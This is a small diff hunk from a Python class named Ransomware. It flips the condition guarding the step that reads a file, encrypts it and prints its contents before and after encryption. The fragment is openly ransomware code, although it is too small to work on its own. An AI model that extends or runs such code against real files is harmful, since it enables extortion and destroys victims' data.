@@ -87,7 +87,7 @@ class Ransomware:
         with open(file_path, 'rb+') as f:
             _data = f.read()
 
-            if not encrypted:
+            if encrypted:
                 print(f'File contents pre encryption: {_data}')
                 data = self.cryptor.encrypt(_data)
                 print(f'File contents post encryption: {data}')
